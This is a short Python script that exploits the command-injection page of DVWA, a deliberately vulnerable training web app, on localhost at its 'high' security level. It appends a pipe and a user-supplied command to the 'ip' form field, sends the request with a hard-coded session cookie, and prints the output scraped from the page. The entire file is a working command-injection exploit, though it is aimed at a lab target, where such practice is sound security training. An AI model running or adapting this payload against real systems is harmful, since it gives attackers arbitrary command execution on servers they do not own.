import requests
from bs4 import BeautifulSoup
import sys
command = sys.argv[1:]
command = " ".join(command)
target = "http://localhost/DVWA/vulnerabilities/exec/"
cookie = {"security":"high", "PHPSESSID":"5b3t3lii8h5il559vb7qu1bplb"}
parameters = {"ip":"127.0.0.1|{}".format(command),"Submit":"Submit"}
req = requests.post(url=target,data=parameters,cookies=cookie)
soup = BeautifulSoup(req.content,"html.parser")
raw_result = soup.find_all("pre")[0].text
print(raw_result)
raw_result = raw_result.split("\n")[4:]
for r in raw_result:
	print(r)
